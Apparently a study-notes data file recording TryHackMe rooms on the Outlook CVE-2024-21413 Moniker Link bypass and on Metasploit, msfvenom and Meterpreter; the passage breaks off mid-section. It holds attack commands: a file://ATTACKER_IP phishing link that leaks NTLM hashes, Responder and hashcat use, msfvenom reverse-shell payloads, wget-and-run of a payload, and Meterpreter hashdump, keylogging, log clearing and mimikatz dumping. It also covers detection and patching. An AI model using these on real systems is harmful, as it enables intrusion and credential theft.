      "Covers CVE-2024-21413, a critical Microsoft Outlook vulnerability (CVSS 9.8) discovered by Haifei Li of Check Point Research. An attacker bypasses Outlook's Protected View by crafting a malicious Moniker Link using the ! character, causing the victim's Outlook to send their netNTLMv2 hash to the attacker via SMB when the link is clicked.",
    keyLearnings: [
      "CVE-2024-21413 published February 13, 2024 — CVSS 9.8 Critical, Attack Complexity: Low",
      "Affects: Microsoft Office LTSC 2021, Microsoft 365 Apps, Office 2019, Office 2016",
      "Outlook's Protected View blocks file:// Moniker Links — but the ! bypass works around it",
      "The ! special character in the URL bypasses Outlook's Protected View",
      "Malicious URL format: file://ATTACKER_IP/test!exploit",
      "Victim's Windows client attempts SMB authentication to attacker's IP → netNTLMv2 hash captured",
      "Attacker captures hash using Responder: responder -I ens5",
      "RCE is theoretically possible via COM (Component Object Model) but no public PoC released",
      "Detection: YARA rule by Florian Roth checks for file:\\\\ in email hyperlinks",
      "Remediation: Apply Microsoft Patch Tuesday February 2024 patches — no Outlook config workaround exists",
    ],
    tasks: [
      {
        num: 1,
        title: "Introduction — CVE-2024-21413",
        notes: `CVE-2024-21413 — Moniker Link

DISCOVERY:
  → Discovered by Haifei Li of Check Point Research
  → Published: February 13th, 2024

CVE SCORING:
  CVSS Score:        9.8 (CRITICAL)
  Impact:            Remote Code Execution + Credential Leak
  Severity:          Critical
  Attack Complexity: Low
  Reference:         https://msrc.microsoft.com/update-guide/vulnerability/CVE-2024-21413

AFFECTED VERSIONS:
  Microsoft Office LTSC 2021  → affected from 19.0.0
  Microsoft 365 Apps for Enterprise → affected from 16.0.1
  Microsoft Office 2019       → affected from 16.0.1
  Microsoft Office 2016       → affected from 16.0.0 before 16.0.5435.1001

WHAT MAKES IT DANGEROUS:
  → Attack complexity = LOW: requires no special skills
  → Just send an email → victim clicks link → credentials captured
  → No user needs to open attachments — just click a hyperlink
  → Protected View (Outlook's safety mechanism) is bypassed`,
        commands: [],
        answer: "Critical",
      },
      {
        num: 2,
        title: "How Moniker Link Works",
        notes: `BACKGROUND — OUTLOOK AND HYPERLINKS:
  Outlook can render emails as HTML and parse hyperlinks:
  → HTTP and HTTPS links → normal browser
  → file:// links → triggers Moniker Links (opens local file or network share)
  → Moniker Links can launch external applications via COM

OUTLOOK'S PROTECTED VIEW:
  → Normally blocks external application triggers from email links
  → Opens emails in READ-ONLY mode
  → Blocks macros (especially from outside the organisation)
  → Shows security warning popup when file:// links are clicked

THE ATTACK — NORMAL (BLOCKED):
  <a href="file://ATTACKER_IP/test">Click me</a>
  → Outlook's Protected View CATCHES and BLOCKS this
  → No SMB authentication attempt made

THE BYPASS — CVE-2024-21413:
  <a href="file://ATTACKER_IP/test!exploit">Click me</a>
  → The ! (exclamation mark) followed by ANY TEXT after the share name
  → This BYPASSES Outlook's Protected View check
  → Outlook fails to properly validate the URL
  → Windows attempts SMB authentication to ATTACKER_IP

WHAT HAPPENS ON CLICK:
  1. Victim clicks the "Click me" link
  2. Windows attempts to authenticate to ATTACKER_IP via SMB
  3. Windows uses the victim's current Windows credentials (NTLM)
  4. Attacker's Responder/Impacket captures the netNTLMv2 hash
  5. The SMB share doesn't need to actually exist on attacker's machine

RCE POTENTIAL:
  → RCE is possible via COM (Component Object Model) on Windows
  → Moniker Links use COM under the hood
  → No public proof-of-concept for RCE via this CVE yet (at time of room)`,
        commands: [
          '// Malicious HTML in email body:',
          '<p><a href="file://ATTACKER_IP/test!exploit">Click me</a></p>',
          '',
          '// Normal (blocked by Protected View):',
          '<p><a href="file://ATTACKER_IP/test">Click me</a></p>',
        ],
        answer: "file://",
      },
      {
        num: 3,
        title: "Exploitation — Capturing netNTLMv2 Hash",
        notes: `ATTACK PREREQUISITES:
  → Attacker email account (SMTP server access)
  → Responder or Impacket SMB server on attacker machine
  → Victim using a vulnerable version of Outlook

STEP 1 — START RESPONDER ON ATTACKER:
  sudo responder -I ens5   → listen for SMB/HTTP/other authentications
  (ens5 = interface on AttackBox; may differ on your machine: eth0, tun0, etc.)

STEP 2 — CRAFT THE EXPLOIT EMAIL:
  Python script using smtplib sends an HTML email with malicious Moniker Link:
  → sender_email = attacker@monikerlink.thm
  → receiver_email = victim@monikerlink.thm
  → HTML content contains: <a href="file://ATTACKER_IP/test!exploit">Click me</a>
  → Replace ATTACKER_IP with actual AttackBox IP in the Moniker Link
  → Replace MAILSERVER placeholder with target machine IP
  → SMTP password for attacker@monikerlink.thm = attacker

STEP 3 — SEND EMAIL:
  python3 exploit.py
  → Enter password: attacker
  → Script prints "Email delivered" on success

STEP 4 — VICTIM CLICKS LINK:
  → Open Outlook on vulnerable machine
  → Open the received email
  → Click "Click me" hyperlink

STEP 5 — CAPTURE THE HASH:
  → Return to Responder terminal on AttackBox
  → netNTLMv2 hash of the victim's Windows account is captured
  → Hash format: Username::Domain:Challenge:Response:NTHash

WHAT CAN YOU DO WITH THE HASH?
  → Crack it with Hashcat: hashcat -m 5600 -a 0 hash.txt rockyou.txt
  → Relay it with ntlmrelayx (impacket) → pass-the-hash attacks`,
        commands: [
          '// Step 1: Start Responder:',
          'sudo responder -I ens5',
          '// Step 2: Create exploit.py with Moniker Link',
          '// Replace ATTACKER_MACHINE with your IP:',
          '// <a href="file://10.10.X.X/test!exploit">Click me</a>',
          '// Step 3: Run exploit:',
          'python3 exploit.py',
          '// Enter password: attacker',
          '// Step 4: Victim opens email and clicks link',
          '// Step 5: Hash appears in Responder output',
          '',
          '// Crack captured netNTLMv2 hash:',
          'hashcat -m 5600 -a 0 captured_hash.txt /usr/share/wordlists/rockyou.txt',
        ],
        answer: "responder",
      },
      {
        num: 4,
        title: "Detection and Remediation",
        notes: `─── DETECTION ───

YARA RULE (by Florian Roth / X__Junior):
  Rule name: EXPL_CVE_2024_21413_Microsoft_Outlook_RCE_Feb24
  Detects: emails containing file:// patterns in Moniker Links
  Conditions:
    → file size < 1000KB
    → Email has "Subject:" and "Received:" headers
    → Contains regex match: file:///\\\\[filename with suspicious extension]!

WIRESHARK DETECTION:
  → SMB authentication request from victim to attacker visible in packet capture
  → Shows truncated netNTLMv2 hash in SMB2 session setup request
  → Look for: unexpected SMB traffic to external IPs

SIEM ALERTS:
  → Alert on outbound SMB (port 445) connections to external IPs
  → Alert on file:// URLs in email bodies
  → Alert on Responder-like traffic patterns

─── REMEDIATION ───

PRIMARY FIX:
  → Apply Microsoft Patch Tuesday February 2024 patches
  → Update via Windows Update or Microsoft Update Catalog
  → Check KB articles by Office build for your specific version

LIMITATIONS (what WON'T work):
  → Cannot reconfigure Outlook to prevent the Protected View bypass
  → Blocking SMB entirely may break legitimate network shares
  → No known Outlook config workaround

WHAT MIGHT HELP:
  → Block outbound SMB at the FIREWALL level (if no external SMB needed)
  → Depends on organisation — may break legitimate network share access

USER TRAINING (general):
  → Do NOT click random links in emails — especially unsolicited
  → Preview links before clicking (hover to see URL)
  → Forward suspicious emails to the security team`,
        commands: [
          '// Apply Windows Updates (PowerShell):',
          'Install-Module PSWindowsUpdate',
          'Get-WindowsUpdate',
          'Install-WindowsUpdate -AcceptAll',
          '// Block outbound SMB at firewall (Windows Firewall):',
          'netsh advfirewall firewall add rule name="Block Outbound SMB" dir=out action=block protocol=tcp remoteport=445',
          '// Check Office version:',
          '// File → Account → About [App Name] in any Office application',
        ],
        answer: "netNTLMv2",
      },
    ],
    tools: ["Responder", "Hashcat", "Python3 (smtplib)", "Wireshark"],
    mitre: [
      "T1187 — Forced Authentication (SMB/WebDAV credential capture)",
      "T1071.001 — Application Layer Protocol: Web Protocols",
      "T1566.002 — Phishing: Spearphishing Link",
    ],
    personalNotes:
      "The bypass is deceptively simple — just adding ! after the share name defeats Outlook's Protected View. This is a real-world phishing technique. Responder is the go-to tool for capturing NTLM hashes from poisoned responses. Hashcat mode 5600 = NetNTLMv2. Patch is the only real fix — no Outlook config can prevent the bypass.",
  },


  // ═══════════════════════════════════════════════════════
  // EXPLOITATION BASICS
  // ═══════════════════════════════════════════════════════

  {
    id: "metasploit-introduction",
    title: "Metasploit: Introduction",
    platform: "TryHackMe",
    category: "Exploitation",
    difficulty: "Easy",
    icon: "🎯",
    completed: true,
    tags: ["Metasploit", "msfconsole", "Exploits", "Payloads", "Auxiliary", "EternalBlue", "Meterpreter"],
    overview:
      "Introduction to the Metasploit Framework — the most widely used exploitation framework. Covers the main components (msfconsole, modules, msfvenom), module categories (auxiliary, encoders, exploits, payloads, post), the difference between exploits/vulnerabilities/payloads, staged vs inline payloads, and key msfconsole commands (use, search, set, setg, show, info, back, sessions).",
    keyLearnings: [
      "Metasploit Framework = open-source CLI version | Metasploit Pro = commercial GUI version",
      "Module categories: Auxiliary (scanners/crawlers), Encoders, Evasion, Exploits, NOPs, Payloads, Post",
      "Exploit = code using a vulnerability | Payload = code that runs on target to achieve goal | Vulnerability = the flaw",
      "Staged payload (windows/x64/shell/reverse_tcp) uses / separator | Inline/Single (generic/shell_reverse_tcp) uses _ separator",
      "Payload types: Singles (self-contained), Stagers (set up channel), Stages (downloaded by stager), Adapters (convert formats)",
      "set = module-level parameter | setg = global parameter (persists across modules)",
      "search type:exploit platform:windows ms17 — filter searches by type/platform/CVE",
      "EternalBlue (MS17-010) = NSA exploit leaked by Shadow Brokers, used in WannaCry 2017",
      "sessions command lists all active sessions | sessions -i N interacts with session N",
      "exploit -z runs exploit and backgrounds session immediately",
    ],
    tasks: [
      {
        num: 1,
        title: "Main Components of Metasploit",
        notes: `METASPLOIT VERSIONS:
  Metasploit Pro  → commercial, GUI, task automation
  Metasploit Framework → open-source, command-line, on Kali/AttackBox

MAIN INTERFACE: msfconsole
  Launch: msfconsole

CORE CONCEPTS:
  Exploit      → code that uses/takes advantage of a vulnerability
  Vulnerability → design/coding/logic flaw in target system
  Payload      → code that runs ON target to achieve attacker's goal
                  (e.g. open a shell, add a user, launch calc.exe)

MODULE CATEGORIES:
  Auxiliary    → scanners, crawlers, fuzzers, brute-force tools
  Encoders     → encode exploit/payload to evade signature-based AV
  Evasion      → attempt to directly evade antivirus (more advanced than encoders)
  Exploits     → organized by target OS (windows, linux, android, etc.)
  NOPs         → No Operation (0x90) — used as buffer for consistent payload sizes
  Payloads     → code to run on target; subcategories:
                  Singles   → self-contained (add user, launch notepad)
                  Stagers   → set up connection channel for staged payloads
                  Stages    → downloaded by stager; allows larger payloads
                  Adapters  → wrap singles into different formats (e.g. PowerShell)
  Post         → post-exploitation modules

STAGED vs INLINE PAYLOADS:
  Inline (Single): generic/shell_reverse_tcp
    → "_" between shell and reverse = INLINE
    → entire payload sent at once
  Staged:         windows/x64/shell/reverse_tcp
    → "/" between shell and reverse = STAGED
    → stager uploaded first, then stage downloaded

  windows/x64/pingback_reverse_tcp → has "_" → SINGLES (inline)`,
        commands: [
          'msfconsole',
          '// Module location on AttackBox:',
          'ls /opt/metasploit-framework/embedded/framework/modules',
        ],
        answer: null,
      },
      {
        num: 2,
        title: "Msfconsole — Navigation and Commands",
        notes: `LAUNCHING:
  msfconsole    → starts Metasploit console

PROMPT TYPES:
  root@host:~#                  → regular Linux shell (NOT in Metasploit)
  msf6 >                        → msfconsole prompt (no module context)
  msf6 exploit(ms17_010) >      → context prompt (module selected)
  meterpreter >                 → Meterpreter session prompt
  C:\\Windows\\system32>          → shell ON target system

KEY COMMANDS:
  help / ?                      → list all available commands
  help set                      → help for specific command
  history                       → view previously typed commands
  ls / ping etc.                → supports most Linux commands
  clear                         → clear terminal screen

  use exploit/windows/smb/ms17_010_eternalblue  → select a module
  use 2                                          → select by search result number
  back                          → exit current module context
  info                          → detailed info about current module
  info exploit/path/to/module   → info without entering context

  show options                  → list all parameters for current module
  show payloads                 → list compatible payloads for current module
  show all / show exploits      → list all modules of a type

  search ms17-010               → search by CVE/name/keyword
  search type:auxiliary telnet  → filter by module type
  search type:exploit platform:windows apache → filter by type + platform

  set RHOSTS 10.10.10.1         → set parameter for current module
  set PAYLOAD windows/x64/...  → set the payload
  setg RHOSTS 10.10.10.1        → set GLOBAL parameter (persists across modules)
  unset PAYLOAD                 → clear a single parameter
  unset all                     → clear ALL parameters
  unsetg RHOSTS                 → clear global parameter

  exploit / run                 → launch the module
  exploit -z                    → launch and background session automatically
  check                         → check if target is vulnerable (if supported)

  sessions                      → list all active sessions
  sessions -i 2                 → interact with session 2
  background / CTRL+Z           → background current session`,
        commands: [
          'msfconsole',
          'search ms17-010',
          'use exploit/windows/smb/ms17_010_eternalblue',
          'show options',
          'set RHOSTS 10.10.10.5',
          'set LHOST 10.10.14.2',
          'set PAYLOAD windows/x64/meterpreter/reverse_tcp',
          'show payloads',
          'exploit',
          'exploit -z',
          'sessions',
          'sessions -i 1',
          'background',
          'back',
          'info',
          'setg RHOSTS 10.10.10.5',
          'unset all',
          'search type:auxiliary telnet',
          'search type:exploit platform:windows ms17',
        ],
        answer: null,
      },
      {
        num: 3,
        title: "Working with Modules — Parameters",
        notes: `COMMON PARAMETERS:
  RHOSTS    → Remote host(s) IP(s) — target system(s)
              Supports: single IP, CIDR range (10.10.10.0/24),
              range (10.10.10.1-20), file:/path/targets.txt

  RPORT     → Remote port — port on target system the service runs on
              Check: RPORT may have preset value (e.g. 80 for HTTP, 445 for SMB)
              Verify it matches your target!

  PAYLOAD   → The payload to use with the exploit
              Preset default; use show payloads to see alternatives
              Set with: set payload windows/x64/meterpreter/reverse_tcp

  LHOST     → Local host = your attacking machine IP (AttackBox/Kali)
              Required for REVERSE payloads

  LPORT     → Local port = port on attacking machine for reverse shell
              Can be any unused port; default 4444
              Change if 4444 is in use: set LPORT 6666

  SESSION   → Existing session ID for post-exploitation modules
              Use sessions command to find the ID

WORKFLOW EXAMPLE (EternalBlue):
  use exploit/windows/smb/ms17_010_eternalblue
  set RHOSTS 10.10.10.5
  set LHOST 10.10.14.2
  show options   → verify all required options are set
  exploit

POST-EXPLOITATION MODULE EXAMPLE:
  use post/windows/gather/enum_domain_users
  show options   → requires SESSION parameter
  set SESSION 1
  run`,
        commands: [
          'use exploit/windows/smb/ms17_010_eternalblue',
          'show options',
          'set RHOSTS 10.10.10.5',
          'set LHOST 10.10.14.2',
          'set LPORT 6666',
          '// How would you set LPORT to 6666?',
          'set LPORT 6666',
          '// Set global RHOSTS:',
          'setg RHOSTS 10.10.19.23',
          '// Clear a set payload:',
          'unset PAYLOAD',
          '// Proceed with exploitation:',
          'exploit',
          '// or:',
          'run',
        ],
        answer: null,
      },
    ],
    tools: ["Metasploit Framework", "msfconsole"],
    mitre: [
      "T1190 — Exploit Public-Facing Application",
      "T1210 — Exploitation of Remote Services",
      "T1059.001 — PowerShell (via adapters/payloads)",
    ],
    personalNotes:
      "Staged vs inline: slash (/) = staged, underscore (_) = inline/single. setg is your best friend on multi-target engagements. search type:exploit platform:windows is how you narrow down results fast. EternalBlue (ms17_010_eternalblue) = most common exam exploit target. exploit -z for instant background.",
  },

  // ─────────────────────────────────────────────────────────
  {
    id: "metasploit-exploitation",
    title: "Metasploit: Exploitation",
    platform: "TryHackMe",
    category: "Exploitation",
    difficulty: "Easy",
    icon: "💥",
    completed: true,
    tags: ["Metasploit", "msfvenom", "Scanning", "Database", "Workspaces", "multi/handler", "Payloads"],
    overview:
      "Advanced Metasploit usage covering port scanning within MSF, the PostgreSQL database integration (workspaces, db_nmap, hosts, services), vulnerability scanning, exploitation workflow, session management, and msfvenom payload generation. Covers creating reverse shells in multiple formats (ELF, EXE, PHP, ASP, Python) and catching them with multi/handler.",
    keyLearnings: [
      "Metasploit can run Nmap directly: nmap -sS TARGET or db_nmap to save results to database",
      "Database setup: systemctl start postgresql → sudo -u postgres msfdb init → db_status in msfconsole",
      "Workspaces isolate engagements: workspace -a NAME (add), workspace NAME (switch), workspace -d NAME (delete)",
      "db_nmap saves scan results automatically | hosts command lists saved hosts | services lists saved services",
      "hosts -R populates RHOSTS from database | services -S NAME filters by service name",
      "msfvenom -p PAYLOAD LHOST=IP LPORT=PORT -f FORMAT > output_file",
      "exploit/multi/handler catches incoming reverse shell connections from msfvenom payloads",
      "Linux ELF: -f elf | Windows EXE: -f exe | PHP: -f raw | ASP: -f asp | Python: -f raw",
      "Staged payload indicator (/) vs inline (_): windows/meterpreter/reverse_tcp vs windows/meterpreter_reverse_tcp",
      "ELF files need chmod +x before execution on Linux targets",
    ],
    tasks: [
      {
        num: 1,
        title: "Scanning with Metasploit",
        notes: `PORT SCANNING IN MSF:
  search portscan  → list all port scanning modules
  Main scanners:
    auxiliary/scanner/portscan/tcp   → TCP port scanner
    auxiliary/scanner/portscan/syn   → TCP SYN scanner
    auxiliary/scanner/portscan/ack   → TCP ACK Firewall Scanner

  KEY OPTIONS for portscan:
    CONCURRENCY → simultaneous targets to scan
    PORTS       → range to scan (e.g. 1-10000; NOT same as Nmap's top 1000)
    RHOSTS      → target IP or CIDR range
    THREADS     → parallel threads (more = faster)

RUNNING NMAP FROM MSFCONSOLE:
  nmap -sS 10.10.10.5       → runs Nmap directly (output not saved to DB)
  db_nmap -sV -p- 10.10.10.5 → runs Nmap AND saves results to DB

SPECIFIC SERVICE SCANNERS:
  auxiliary/scanner/discovery/udp_sweep → quick UDP service identification
  auxiliary/scanner/smb/smb_version     → identify SMB version
  auxiliary/scanner/smb/smb_enumshares  → enumerate SMB shares
  auxiliary/scanner/smb/smb_login       → brute-force SMB credentials
  auxiliary/scanner/vnc/vnc_login       → brute-force VNC credentials
  auxiliary/scanner/smtp/smtp_relay     → check for open SMTP relay

LOW-HANGING FRUIT TO SCAN FOR:
  HTTP (80/8080) → web apps with SQLi/RCE vulnerabilities
  FTP (21)       → anonymous login, interesting files
  SMB (445)      → MS17-010 (EternalBlue), share access
  SSH (22)       → weak/default credentials
  RDP (3389)     → BlueKeep, weak credentials`,
        commands: [
          'search portscan',
          'use auxiliary/scanner/portscan/tcp',
          'set RHOSTS 10.10.10.5',
          'set PORTS 1-10000',
          'set THREADS 10',
          'run',
          '// Nmap from msfconsole (saves to DB):',
          'db_nmap -sV -p- 10.10.10.5',
          '// Nmap without saving:',
          'nmap -sS 10.10.10.5',
          '// SMB version scan:',
          'use auxiliary/scanner/smb/smb_version',
          'set RHOSTS 10.10.10.5',
          'run',
          '// UDP sweep:',
          'use auxiliary/scanner/discovery/udp_sweep',
          'set RHOSTS 10.10.10.5',
          'run',
        ],
        answer: null,
      },
      {
        num: 2,
        title: "Metasploit Database (PostgreSQL)",
        notes: `DATABASE SETUP (if not already done):
  systemctl start postgresql
  sudo -u postgres msfdb init
  (Note: run msfdb as non-root via sudo -u postgres)

IN MSFCONSOLE:
  db_status                   → check if database is connected
  → should show "Connected to msf. Connection type: postgresql."

WORKSPACES:
  workspace                   → list all workspaces (* = current)
  workspace -a tryhackme      → create new workspace named "tryhackme"
  workspace tryhackme         → switch to workspace
  workspace default           → switch back to default
  workspace -d tryhackme      → delete workspace
  workspace -D                → delete ALL workspaces
  workspace -r old new        → rename workspace
  workspace -h                → help

DATABASE COMMANDS:
  db_nmap -sV 10.10.10.5     → run Nmap and save results
  hosts                       → list all discovered hosts
  hosts -R                    → populate RHOSTS from all saved hosts
  services                    → list all discovered services
  services -S netbios         → filter services by name
  services -p 445             → filter by port number
  vulns                       → list all identified vulnerabilities
  loot                        → list all collected loot
  notes                       → list all notes
  db_export -f xml report.xml → export database to XML

WORKFLOW FOR MULTI-TARGET ENGAGEMENT:
  1. db_nmap -sV 10.10.10.0/24     → discover all hosts and services
  2. hosts -R                       → set RHOSTS to all found hosts
  3. use auxiliary/scanner/smb/smb_ms17_010
  4. run                            → scan all hosts for MS17-010
  5. Use exploit for vulnerable ones`,
        commands: [
          '// Initial setup (one-time):',
          'systemctl start postgresql',
          'sudo -u postgres msfdb init',
          '// In msfconsole:',
          'db_status',
          'workspace',
          'workspace -a engagement1',
          'workspace engagement1',
          'db_nmap -sV -p- 10.10.10.5',
          'hosts',
          'hosts -R',
          'services',
          'services -S smb',
          'vulns',
          '// Use hosts -R to auto-populate RHOSTS:',
          'use auxiliary/scanner/smb/smb_ms17_010',
          'hosts -R',
          'run',
        ],
        answer: null,
      },
      {
        num: 3,
        title: "msfvenom — Payload Generation",
        notes: `MSFVENOM — DEFINITION:
Replaced Msfpayload and Msfencode. Generates standalone payloads in many formats.

BASIC SYNTAX:
  msfvenom -p PAYLOAD LHOST=IP LPORT=PORT -f FORMAT > output_file

  -p PAYLOAD    → specify payload
  LHOST=IP      → attacker's IP (callback address)
  LPORT=PORT    → attacker's listening port
  -f FORMAT     → output format (elf, exe, raw, asp, etc.)
  -e ENCODER    → encoder to use (e.g. php/base64)
  -l payloads   → list all available payloads
  --list formats → list all output formats

COMMON PAYLOAD + FORMAT COMBINATIONS:

  LINUX ELF:
  msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=IP LPORT=4444 -f elf > rev.elf
  chmod +x rev.elf && ./rev.elf  → on target

  WINDOWS EXE:
  msfvenom -p windows/meterpreter/reverse_tcp LHOST=IP LPORT=4444 -f exe > rev.exe

  PHP:
  msfvenom -p php/meterpreter_reverse_tcp LHOST=IP LPORT=4444 -f raw > rev.php
  (Note: edit file — remove leading comment #, add closing ?> tag)

  ASP (Windows web servers):
  msfvenom -p windows/meterpreter/reverse_tcp LHOST=IP LPORT=4444 -f asp > rev.asp

  PYTHON:
  msfvenom -p cmd/unix/reverse_python LHOST=IP LPORT=4444 -f raw > rev.py

CATCHING THE REVERSE SHELL (multi/handler):
  use exploit/multi/handler
  set PAYLOAD php/reverse_php        → must match payload used in msfvenom
  set LHOST 10.10.14.2
  set LPORT 4444
  run                                 → start listener, wait for connection
  (multi/handler works for Meterpreter AND regular shells)

TRANSFERRING ELF TO TARGET:
  Attacker: python3 -m http.server 9000
  Target:   wget http://ATTACKER_IP:9000/rev.elf
  Target:   chmod +x rev.elf && ./rev.elf`,
        commands: [
          '// List all payloads:',
          'msfvenom -l payloads | grep meterpreter',
          '// Linux ELF payload:',
          'msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.10.14.2 LPORT=4444 -f elf > rev.elf',
          '// Windows EXE payload:',
          'msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.2 LPORT=4444 -f exe > rev.exe',
          '// PHP payload:',
          'msfvenom -p php/meterpreter_reverse_tcp LHOST=10.10.14.2 LPORT=4444 -f raw > rev.php',
          '// ASP payload:',
          'msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.2 LPORT=4444 -f asp > rev.asp',
          '// Python payload:',
          'msfvenom -p cmd/unix/reverse_python LHOST=10.10.14.2 LPORT=4444 -f raw > rev.py',
          '// PHP with base64 encoding:',
          'msfvenom -p php/meterpreter/reverse_tcp LHOST=10.10.14.2 -f raw -e php/base64',
          '// Setup listener:',
          'use exploit/multi/handler',
          'set PAYLOAD linux/x86/meterpreter/reverse_tcp',
          'set LHOST 10.10.14.2',
          'set LPORT 4444',
          'run',
        ],
        answer: null,
      },
    ],
    tools: ["Metasploit Framework", "msfconsole", "msfvenom", "db_nmap", "PostgreSQL"],
    mitre: [
      "T1046 — Network Service Discovery",
      "T1203 — Exploitation for Client Execution",
      "T1105 — Ingress Tool Transfer (msfvenom payloads)",
      "T1059 — Command and Scripting Interpreter",
    ],
    personalNotes:
      "msfvenom payload format cheat sheet: elf (Linux), exe (Windows), raw (PHP/Python), asp (Windows web). Always chmod +x for ELF. multi/handler PAYLOAD must match exactly what msfvenom used. db_nmap > nmap for multi-target engagements. Staged (/) = smaller initial payload; Inline (_) = self-contained.",
  },

  // ─────────────────────────────────────────────────────────
  {
    id: "metasploit-meterpreter",
    title: "Metasploit: Meterpreter",
    platform: "TryHackMe",
    category: "Exploitation",
    difficulty: "Easy",
    icon: "🐍",
    completed: true,
    tags: ["Meterpreter", "Post-Exploitation", "hashdump", "getsystem", "migrate", "Kiwi", "mimikatz", "keyscan"],
    overview:
      "Deep dive into Meterpreter — Metasploit's in-memory post-exploitation agent. Covers how Meterpreter works (runs in RAM, never writes to disk, encrypted TLS comms), available flavors for all platforms, key commands (getuid, getsystem, hashdump, migrate, search, shell), and post-exploitation with the Kiwi extension (mimikatz integration) for credential dumping.",
    keyLearnings: [
      "Meterpreter runs in MEMORY (RAM) — never written to disk — avoids most AV file scans",
      "Meterpreter uses encrypted TLS communication — avoids network IDS/IPS detection",
      "Meterpreter disguises itself as a legitimate process (e.g. spoolsv.exe, svchost.exe)",
      "getuid shows current user context | getsystem attempts privilege escalation to NT AUTHORITY\\SYSTEM",
      "hashdump dumps SAM database NTLM hashes — requires SYSTEM privileges",
      "migrate PID — move Meterpreter to another process (for stability or keylogging)",
      "migrate from higher to lower privilege loses privileges — be careful",
      "load kiwi — loads mimikatz integration | creds_all dumps all credentials",
      "keyscan_start → keyscan_dump → keyscan_stop — keystroke logging",
      "search -f flag.txt — find files on target | shell — drop into CMD/bash shell",
      "post/multi/manage/shell_to_meterpreter — upgrade a regular shell to Meterpreter",
    ],
    tasks: [
      {
        num: 1,
        title: "How Meterpreter Works",
        notes: `METERPRETER — DEFINITION:
An advanced, dynamically extensible Metasploit payload that acts as an agent on the compromised system.

KEY STEALTH FEATURES:

1. RUNS IN MEMORY (RAM):
   → Never written to disk on the target
   → Avoids file-based AV scans (most AV scans new files on disk)
   → Appears as a legitimate running process (e.g. spoolsv.exe, svchost.exe)
   → No "meterpreter.exe" file ever created

2. ENCRYPTED COMMUNICATIONS:
   → Uses TLS encryption between target and attacker's Metasploit
   → Network IDS/IPS cannot read the traffic content
   → Only detectable if organization does TLS inspection

3. PROCESS INJECTION:
   → Meterpreter injects into an existing process
   → getpid shows which PID it's running under
   → ps shows all processes — Meterpreter PID will show as legitimate process name

4. NO DLL FINGERPRINTS:
   → DLLs loaded by the Meterpreter process are all legitimate Windows DLLs
   → tasklist /m /fi "pid eq PID" shows only normal Windows DLLs

LIMITATION:
   → Major antivirus software DOES detect Meterpreter signatures
   → These stealth features provide SOME degree of evasion, not complete protection
   → More advanced OPSEC requires additional obfuscation

AVAILABLE METERPRETER FLAVORS (platforms):
   Android, Apple iOS, Java, Linux, OSX, PHP, Python, Windows
   → Choose based on: target OS, available components, network connection types`,
        commands: [
          '// Check which process Meterpreter is hiding in:',
          'getpid',
          '// List all running processes:',
          'ps',
          '// Check DLLs of a specific process:',
          'shell',
          'tasklist /m /fi "pid eq 1304"',
          '// Return to Meterpreter from shell:',
          '// Press CTRL+Z or type exit',
        ],
        answer: null,
      },
      {
        num: 2,
        title: "Meterpreter Commands Reference",
        notes: `CORE COMMANDS:
  background / bg          → background current session
  exit                     → terminate Meterpreter session
  help / ?                 → display help menu
  info                     → info about a post module
  load MODULE              → load extension (kiwi, python, etc.)
  migrate PID              → move Meterpreter to another process
  run MODULE               → execute a Meterpreter script or post module
  sessions                 → list/switch sessions
  guid                     → get session GUID

FILE SYSTEM COMMANDS:
  cd / ls / pwd            → navigate filesystem
  cat FILE                 → display file contents
  edit FILE                → edit a file (opens vi)
  rm FILE                  → delete file
  upload FILE /path        → upload file TO target
  download /path/file .    → download file FROM target
  search -f flag.txt       → search for files by name
  search -f *.txt -d /     → search all .txt files from root

NETWORKING COMMANDS:
  arp                      → display ARP cache
  ifconfig / ipconfig      → network interfaces on target
  netstat                  → network connections
  portfwd                  → port forwarding through session
  route                    → view/modify routing table

SYSTEM COMMANDS:
  clearev                  → clear Windows event logs
  execute -f CMD           → execute a command on target
  getpid                   → current process ID
  getuid                   → current user (e.g. NT AUTHORITY\SYSTEM)
  getsystem                → attempt to escalate to SYSTEM
  kill PID                 → terminate a process
  ps                       → list running processes
  reboot                   → reboot target system
  shell                    → drop into system shell (CMD/bash)
  shutdown                 → shutdown target
  sysinfo                  → OS/hostname info

POST-EXPLOITATION COMMANDS:
  hashdump                 → dump SAM database NTLM hashes (needs SYSTEM)
  keyscan_start            → start capturing keystrokes
  keyscan_dump             → display captured keystrokes
  keyscan_stop             → stop keystroke capture
  screenshot               → capture desktop screenshot
  screenshare              → live desktop stream
  record_mic N             → record N seconds of audio
  webcam_snap              → take webcam photo
  idletime                 → seconds since last user input`,
        commands: [
          '// Essential post-exploitation sequence:',
          'getuid              // who are we running as?',
          'getsystem           // try to escalate to SYSTEM',
          'getuid              // verify SYSTEM access',
          'ps                  // list processes',
          'hashdump            // dump NTLM password hashes',
          '// Find flags:',
          'search -f flag*.txt',
          '// Download a file:',
          'download C:\\\\Users\\\\Jon\\\\Desktop\\\\flag.txt /tmp/',
          '// Drop to shell:',
          'shell',
          '// Background shell and return to meterpreter:',
          '// CTRL+Z → type exit',
          '// Migrate to a stable process:',
          'ps',
          'migrate 716        // migrate to a SYSTEM process',
          '// Check event logs:',
          'clearev            // clear logs to reduce forensic footprint',
        ],
        answer: null,
      },
      {
        num: 3,
        title: "Post-Exploitation — Kiwi and Advanced",
        notes: `UPGRADING A SHELL TO METERPRETER:
  // From msfconsole after backgrounding a regular shell:
  use post/multi/manage/shell_to_meterpreter
  show options  → requires SESSION parameter
  set SESSION 1
  run

LOADING KIWI (mimikatz integration):
  load kiwi
  → Adds mimikatz-based credential extraction commands

KIWI COMMANDS (after load kiwi):
  creds_all              → retrieve ALL credentials (parsed)
  creds_msv              → LM/NTLM credentials
  creds_kerberos         → Kerberos tickets
  creds_wdigest          → WDigest plaintext credentials
  lsa_dump_sam           → dump SAM (raw)
  lsa_dump_secrets       → dump LSA secrets
  golden_ticket_create   → create a golden Kerberos ticket
  wifi_list              → list WiFi profiles and credentials

LOADING PYTHON:
  load python
  python_execute "print('Hello')"

POST-EXPLOITATION MODULES (run from Meterpreter):
  run post/windows/gather/hashdump           → dump hashes
  run post/windows/gather/enum_domain_users  → enumerate domain users
  run post/multi/recon/local_exploit_suggester → suggest local exploits
  run post/windows/manage/persistence        → setup persistence

HASHDUMP OUTPUT FORMAT:
